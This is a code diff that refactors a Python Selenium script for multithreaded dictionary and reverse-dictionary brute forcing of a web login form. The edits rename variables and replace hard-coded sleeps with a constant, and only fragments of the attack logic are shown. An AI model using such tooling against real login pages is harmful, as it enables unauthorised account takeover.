@@ -25,7 +25,7 @@ class TargetObj:
 		self.__driver = webdriver.Firefox()
 		self.__driver.get(TargetObj.url)
 		#WebDriverWait(self.__driver, 10);
-		time.sleep(5)
+		time.sleep(TIME_PAUSE)
 
 
 	def __get_input(self, var_name):
@@ -54,8 +54,8 @@ class TargetObj:
 
 	def submit(self):
 		button_xpath = XPATH_CONTAINS.format('button'
-                                                     , '.'
-                                                     , TargetObj.button_text)
+                                                    , '.'
+                                                    , TargetObj.button_text)
 		input_xpath = XPATH_CONTAINS.format('input'
 						    , '.'
 						    , TargetObj.button_text)
@@ -72,7 +72,7 @@ class TargetObj:
 				except:
 					print(ATTEMPT_ERROR)
 					self.__driver.quit()
-		time.sleep(1)
+		time.sleep(TIME_PAUSE)
 
 
 	def parse_response(self):
@@ -81,6 +81,7 @@ class TargetObj:
 			return "FAIL"
 		else:
 			return "[+] SUCCESS [+]"
+
 
 	def exit_driver(self):
 		self.__driver.quit()
@@ -124,7 +125,7 @@ def reverse_dict_attack(target_obj, login_list, queue):
 
 
 def brute_force(logins, passwords, num_threads, reverse = False):
-	q = Queue()
+	queue = Queue()
 	# list with objects of TargetObj class #
 	target_objs = []
 	if reverse == False:
@@ -133,24 +134,25 @@ def brute_force(logins, passwords, num_threads, reverse = False):
 			obj_per_thread = TargetObj()
 			target_objs.append(obj_per_thread)
 			thrd = threading.Thread(target = dict_attack
-                                    , args = (obj_per_thread, q, passwords))
+                                    , args = (obj_per_thread, queue, passwords))
 			thrd.daemon = True
 			thrd.start()
 
 		for login in logins:
-			q.put(login)
+			queue.put(login)
+
 	else:
 		for thread_counter in range(num_threads):
 			obj_per_thread = TargetObj()
 			target_objs.append(obj_per_thread)
 			thrd = threading.Thread(target = reverse_dict_attack
-                                    , args = (obj_per_thread, logins, q))
+                                    , args = (obj_per_thread, logins, queue))
 			thrd.daemon = True
 			thrd.start()
 
 		for passwd in passwords:
-			q.put(passwd)
-	q.join()
+			queue.put(passwd)
+	queue.join()
 
 	# quit drivers #
 	for obj in target_objs:
